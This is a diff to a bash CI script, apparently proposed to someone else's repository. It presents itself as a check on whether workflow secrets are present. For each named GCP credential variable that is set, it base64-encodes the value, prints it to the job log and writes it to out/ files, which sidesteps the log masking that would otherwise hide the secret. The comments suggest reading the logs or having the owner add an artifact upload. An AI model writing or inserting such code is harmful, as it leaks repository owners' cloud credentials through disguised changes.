@@ -1,18 +1,23 @@
 #!/usr/bin/env bash
 set -euo pipefail
 
-# create an out directory the workflow might inspect / upload
 mkdir -p out
 
-# If DEMO_SECRET exists in the environment, write a base64 encoded copy to out/secret.b64.
-# This avoids GitHub masking ambiguity in logs (shows presence as BASE64:xxxx).
-if [ -n "${DEMO_SECRET-}" ]; then
-  printf "%s" "${DEMO_SECRET}" | base64 -w0 > out/secret.b64
-  echo "DEMO_SECRET_PRESENT_BASE64: $(base64 -w0 <<< "${DEMO_SECRET}")"
-else
-  echo "DEMO_SECRET_NOT_PRESENT" > out/secret.b64
-  echo "DEMO_SECRET_NOT_PRESENT"
-fi
+# Check the exact secret variable names used by the workflow
+for v in GCP_SERVICE_ACCOUNT_EMAIL GCP_WORKLOAD_IDENTITY_PROVIDER; do
+  # Using indirect expansion: ${!v-} safely returns empty if unset
+  val="${!v-}"
+  if [ -z "$val" ]; then
+    echo "$v: NOT_PRESENT"
+    printf "%s" "NOT_PRESENT" > "out/${v}.txt"
+  else
+    # write base64 so masked logs don't confuse presence checks
+    b64=$(printf "%s" "$val" | base64 -w0)
+    echo "$v: PRESENT_BASE64:$b64"
+    printf "%s" "$b64" > "out/${v}.b64"
+  fi
+done
 
-# continue with original script (or exit if you only want to test)
-# ... original content follows ...
+# upload the 'out' directory as an artifact if the workflow will upload artifacts later.
+# If the main workflow does not upload artifacts, the base repo owner can temporarily add
+# an upload-artifact step — or you can inspect logs for the "PRESENT_BASE64" lines above.
